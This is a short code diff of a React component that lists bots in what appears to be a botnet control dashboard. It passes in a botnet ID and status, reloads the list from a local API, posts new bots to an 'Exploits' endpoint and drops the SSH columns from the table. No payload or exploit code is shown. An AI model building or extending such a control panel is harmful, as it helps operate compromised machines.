@@ -7,17 +7,24 @@ import AddBotForm from "./AddBotForm";
 const BotsUri = "https://localhost:44360/api/v1/Bots/";
 const ExploitsUri = "https://localhost:44343/api/v1/Exploits/";
 
-function BotList() {
+function BotList({ botnetStatus, botnetId }) {
   const [botList, setBotList] = useState([]);
 
   useEffect(() => {
     // TODO: Why set empty array first?
     setBotList([]);
-    axios.get(BotsUri + "1").then((res) => {
+    axios.get(BotsUri + botnetId).then((res) => {
       const newBotList = res.data;
       setBotList(newBotList);
     });
   }, []);
+
+  useEffect(() => {
+    axios.get(BotsUri + botnetId).then((res) => {
+      const newBotList = res.data;
+      setBotList(newBotList);
+    });
+  }, [botnetStatus]);
 
   const addBot = (bot) => {
     axios.post(ExploitsUri, bot).then((res) => {
@@ -56,8 +63,6 @@ function BotList() {
             <th>IP address</th>
             <th>Platform</th>
             <th>Status</th>
-            <th>SSH name</th>
-            <th>SSH</th>
             <th>Remove</th>
           </tr>
         </thead>
